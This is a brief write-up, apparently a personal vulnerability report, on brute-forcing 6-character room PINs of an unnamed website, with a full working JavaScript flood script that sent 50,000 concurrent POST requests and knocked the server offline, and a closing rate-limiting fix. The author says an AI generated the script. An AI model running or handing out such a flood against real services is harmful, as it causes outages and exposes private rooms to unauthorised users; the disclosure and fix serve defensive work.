# DoS via Brute-forcing PIN

## Exploitation

At the time of this DoS, the website used 6 character randomly-generared alphanumeric codes. I wanted to see if I would be able to brute-force these PINs to be able to join random rooms.

I used burp suite to capture the headers, and used AI to make a script to send POST requests to the endpoint asynchrounously to stress-test the server. The code used is provided below.

```javascript
async function flood(y) {
    const url = "https://[REDACTED].com/projects/access/";
    const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    const bearer = ""; //jwt here
    
    console.log(`Starting flood of ${y} requests...`);

    const tasks = [];
    for (let i = 0; i < y; i++) {
        // Generate random 6-char alphanumeric code
        let code = "";
        for (let j = 0; j < 6; j++) {
            code += chars.charAt(Math.floor(Math.random() * chars.length));
        }

        // Push the fetch promise into an array
        tasks.push(
            fetch(url + code, {
                method: "POST",
                headers: {
                    "Authorization": "Bearer " + bearer,
                    "Accept": "application/json, text/plain, */*",
                    "Content-Type": "application/json"
                }
            }).then(res => console.log(`Code ${code}: ${res.status}`))
               .catch(err => console.error(`Request ${code} failed`))
        );
    }

    // Fire all at once
    await Promise.all(tasks);
    console.log("Flood complete.");
}

// Set your 'y' value here (e.g., 500)
flood(50000); // i didn't use 500
```
It managed to make his server unresponsive.

## The fix
Implement strict rate-limiting throughout the website for non-GET requests, especially these endpoints that can be easily brute-forced, as private information (in this case, private code) can be accessed by unauthorized users.
